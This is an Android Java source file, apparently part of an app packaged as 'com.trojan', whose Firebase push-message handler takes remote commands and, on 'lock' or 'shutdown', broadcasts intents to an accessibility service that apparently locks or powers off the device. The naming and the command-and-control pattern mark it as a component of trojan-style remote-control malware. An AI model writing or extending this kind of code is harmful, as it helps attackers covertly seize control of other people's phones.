package com.trojan;

import android.content.Intent;
import android.util.Log;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import java.util.Map;

public class MyFirebaseMessagingService extends FirebaseMessagingService {
    private static final String TAG = "MyFirebaseService";

    @Override
    public void onMessageReceived(RemoteMessage remoteMessage) {
        if (remoteMessage.getData().size() > 0) {
            Map<String, String> data = remoteMessage.getData();
            Log.d(TAG, "Message data payload: " + data);
            String action = data.get("action");
            if (action == null) return;

            if (action.equals("lock")) {
                sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_LOCK_SCREEN));
            } else if (action.equals("shutdown")) {
                sendBroadcast(new Intent(PowerAccessibilityService.ACTION_TRIGGER_SHUTDOWN));
            }
        }
    }

    @Override
    public void onNewToken(String token) {
        Log.d(TAG, "Refreshed FCM token: " + token);
    }
}
